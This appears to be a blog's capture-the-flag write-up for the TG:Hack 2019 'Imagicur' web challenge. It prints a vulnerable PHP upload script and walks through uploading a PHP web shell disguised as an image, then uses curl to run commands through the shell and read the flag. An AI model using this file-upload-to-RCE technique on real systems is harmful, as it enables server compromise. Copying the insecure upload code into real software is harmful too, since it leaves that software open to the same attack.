@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    
+        
+
+    
+    <meta property="og:image" content="http://localhost:4000/banner.jpg" />
+    
+
+    
+    <meta property="og:title" content="Imagicur (web 150)" />
+    
+
+    <!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Imagicur (web 150) | jebidiah-anthony</title>
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="Imagicur (web 150)" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://localhost:4000/chals/ctf/2019_TGHack/web/2_Imagicur.html" />
+<meta property="og:url" content="http://localhost:4000/chals/ctf/2019_TGHack/web/2_Imagicur.html" />
+<meta property="og:site_name" content="jebidiah-anthony" />
+<script type="application/ld+json">
+{"@type":"WebPage","url":"http://localhost:4000/chals/ctf/2019_TGHack/web/2_Imagicur.html","headline":"Imagicur (web 150)","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <style>
+      header {
+	margin-bottom: 0px;
+      }
+      .container {
+	max-width: 1200px;
+      }
+      .sidebar {
+        border-right: 1px dashed #b5e853;
+	bottom: 0;
+        /*height: 100%; */
+	overflow: auto;
+	padding: 10px 10px 10px 10px;
+        position: fixed;
+	top: 0;
+        width: 230px;
+      }
+      
+      .ctf_content {
+        margin-left: 250px;
+	padding-bottom: 5px;
+      }
+      .ctf_content h2 {	padding: 20px 0px 0px 10px; }
+      .ctf_content h3 { margin: 20px 0px 0px 10px; }
+      .ctf_content img {
+	max-width: 910px;
+	padding: 0 10px 0 0;
+      }
+      .ctf_content table { padding: 0 15px; }
+
+      #main_content h1 { padding: 20px 0px 0px 8px; }
+      #main_content h2, p, pre { 
+	padding-right:10px;
+	padding-left:15px; 
+      }
+      #main_content h4 { 
+        margin: 20px 0px 10px 0px; 
+      }
+
+      #main_content h4 { padding-left: 25px; }
+      #main_content ol, ul { margin: 0 0 0 10px; }
+
+      .highlighter-rouge { padding: 0 10px 0 15px; }
+
+      .section-divider{
+        border-bottom: 1.5px solid #b5e853;
+        padding-top:28px;
+        width:55%;
+      }
+      
+      @media screen and (max-height: 450px) {}
+    </style>
+
+  </head>
+
+  <body>
+    <div class="container">
+       <div class="sidebar">
+	 <div><h2 style="margin-bottom:0; padding-top:20px">[SITE PAGES]</h2>
+
+<div style="padding-top:10px">  
+  >  <a href="/">whoami</a>
+</div>
+<div style="padding-top:10px">  
+  >  <a href="/htb.html">
+    
+    htb writeups
+    
+  </a>
+</div>
+<div style="padding-top:10px">
+  > <a href="http://localhost:4000/chals/ctf/2019-CyberSEAGame.html">
+    
+    <strong style="color:orange">ctf writeups</strong>
+    
+  </a>
+</div>
+<div style="padding-top:10px">
+  > <a href="/projects.html">
+    
+    projects
+    
+  </a>
+</div>
+</div>
+	 <div style="padding-bottom:20px">
+           
+             <h2 style="margin-bottom:0; padding-top:20px">[CTF EVENTS]</h2>
+
+
+<div style="padding-top:10px">
+  > <a href="http://localhost:4000/chals/ctf/2019-CyberSEAGame.html">
+  
+  Cyber SEA Game 2019
+  
+  </a>
+</div>
+
+<div style="padding-top:10px">
+  > <a href="http://localhost:4000/chals/ctf/2019-NACTF.html">
+  
+  NACTF 2019
+  
+  </a>
+</div>
+
+<div style="padding-top:10px">
+  > <a href="http://localhost:4000/chals/ctf/2019-TGHack.html">
+  
+  <strong style="color:orange;text-decoration:none">TG:Hack 2019</strong>
+  
+  </a>
+</div>
+
+<div style="padding-top:10px">
+  > <a href="http://localhost:4000/chals/ctf/2019-TJCTF.html">
+  
+  TJCTF 2019
+  
+  </a>
+</div>
+
+
+	   
+	 </div>
+       </div>
+       <div class="ctf_content">
+	 <header>
+           <div class="container">
+             <h1 style="padding:10px 0 0 20px">jebidiah-anthony</h1>
+             <h2 style="padding:0 0 0 20px">write-ups and what not</h2>
+           </div>
+         </header>
+         <section id="main_content"><p><img src="./screenshots/Imagicur.png" alt="Imagicur (150 pts)" /></p>
+
+<hr />
+
+<h2 id="challenge-info">CHALLENGE INFO</h2>
+<ul>
+  <li><strong>CHALLENGE LINK</strong>: https://imagicur.tghack.no/</li>
+  <li>
+    <p><strong>LANDING PAGE</strong>:</p>
+
+    <p><img src="./screenshots/Imagicur_home.png" alt="homepage" /></p>
+
+    <ul>
+      <li>Page Source:
+        <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+
+<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"upload.php"</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
+    Select image to upload:
+    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">name=</span><span class="s">"fileToUpload"</span> <span class="na">id=</span><span class="s">"fileToUpload"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Upload Image"</span> <span class="na">name=</span><span class="s">"submit"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+ 
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+  <li><strong>ASSUMED OBJECTIVE</strong>: Exploit a vulnerability in <strong><em>upload.php</em></strong></li>
+</ul>
+
+<hr />
+
+<h2 id="step-1--examine-the-given-source-code-for-uploadphp">Step 1 : Examine the given source code for <strong><em>upload.php</em></strong></h2>
+
+<ul>
+  <li><strong><em>upload.php</em></strong>
+    <pre><code class="language-PHP">&lt;?php
+$target_dir = "uploads/";
+$uplFilename = basename($_FILES["fileToUpload"]["name"]);
+$imageFileType = strtolower(pathinfo($uplFilename,PATHINFO_EXTENSION));
+$filename = uniqid() . ".$imageFileType";
+$target_file = $target_dir . $filename;
+$uploadOk = 1;
+// Check if image file is a actual image or fake image
+if(isset($_POST["submit"])) {
+    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
+    if($check !== false) {
+        echo "File is an image - " . $check["mime"] . ".";
+        $uploadOk = 1;
+    } else {
+        echo "File is not an image.";
+        $uploadOk = 0;
+    }
+}
+
+if($uploadOk == 0) {
+    echo "Failed upload :( Is it a valid image file?";
+} else {
+    move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);
+    echo "File available at &lt;a href='$target_file'&gt;$target_file&lt;/a&gt;";
+}
+
+?&gt;
+</code></pre>
+    <p><strong>Notes:</strong></p>
+    <ul>
+      <li><strong>PATHINFO_EXTENSION</strong> takes the last given file extension
+        <ul>
+          <li><strong>double extensions</strong> and <strong>null byte injection</strong> won’t work</li>
+        </ul>
+      </li>
+      <li>The <strong>file extension</strong> of the uploaded file is <strong>appended</strong> and saved to a <strong>new filename</strong></li>
+      <li>The uploaded file <strong>needs</strong> to be an image</li>
+      <li>Successfully uploaded files are save in the <strong>uploads/</strong> directory</li>
+    </ul>
+  </li>
+</ul>
+
+<hr />
+
+<h2 id="step-2--create-a-working-payload">Step 2 : Create a working payload</h2>
+
+<ol>
+  <li>
+    <p>Upload an image and intercept the request using <strong>Burp</strong></p>
+
+    <p><img src="./screenshots/Imagicur_upload.png" alt="upload" /></p>
+  </li>
+  <li>
+    <p>Pass the request to <strong>Burp <em>repeater</em></strong></p>
+
+    <p><img src="./screenshots/Imagicur_upload_1.png" alt="upload" /></p>
+
+    <p><strong>Note</strong>:</p>
+    <ul>
+      <li>The image was succesfully uploaded.</li>
+    </ul>
+  </li>
+  <li>
+    <p>Edit the <em>request</em> to contain RCE (Remote Code Execution)</p>
+    <ol>
+      <li>Change the extension of the image to <strong>php</strong>:
+        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----------------------------payload
+Content-Disposition: form-data; name="fileToUpload"; filename="imagicur_payload.php"
+Content-Type: image/png
+</code></pre></div>        </div>
+      </li>
+      <li>
+        <p>Append <strong>PHP code</strong> at the end of the image data</p>
+
+        <p><img src="./screenshots/Imagicur_upload_2.png" alt="RCE code" /></p>
+
+        <p><strong>Note</strong>:</p>
+        <ul>
+          <li>The file was uploaded with a <strong><em>.php</em></strong> extension.</li>
+        </ul>
+      </li>
+    </ol>
+  </li>
+</ol>
+
+<hr />
+
+<h2 id="step-3--extract-the-flag">Step 3 : Extract the flag</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   curl <span class="nt">-d</span> <span class="s2">"cmd=ls -lah ../"</span> <span class="nt">-G</span> <span class="nt">-o-</span> https://imagicur.tghack.no/uploads/5cb9cb05189eb.php
+   <span class="c"># ...</span>
+   <span class="c"># drwxr-xr-x 1 root     root     4.0K Apr 17 12:53 .</span>
+   <span class="c"># drwxr-xr-x 1 root     root     4.0K Apr 17 12:53 ..</span>
+   <span class="c"># -rw-r--r-- 1 root     root       35 Apr 16 07:09 flag.txt</span>
+   <span class="c"># -rw-r--r-- 1 root     root      262 Apr 16 07:09 index.php</span>
+   <span class="c"># -rw-r--r-- 1 root     root      827 Apr 16 07:09 upload.php</span>
+   <span class="c"># drwxr-xr-x 1 www-data www-data  20K Apr 19 13:31 uploads</span>
+
+   curl <span class="nt">-d</span> <span class="s2">"cmd=cat ../flag.txt"</span> <span class="nt">-G</span> <span class="nt">-o-</span> https://imagicur.tghack.no/uploads/5cb9cb05189eb.php
+   <span class="c"># TG19{phony_php_images_can_b_scary}</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="flag--tg19phony_php_images_can_b_scary">FLAG : <strong>TG19{phony_php_images_can_b_scary}</strong></h2>
+</section>
+       </div>
+    </div>
+
+    
+      <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'true', 'auto');
+        ga('send', 'pageview');
+      </script>
+    
+  </body>
+</html>
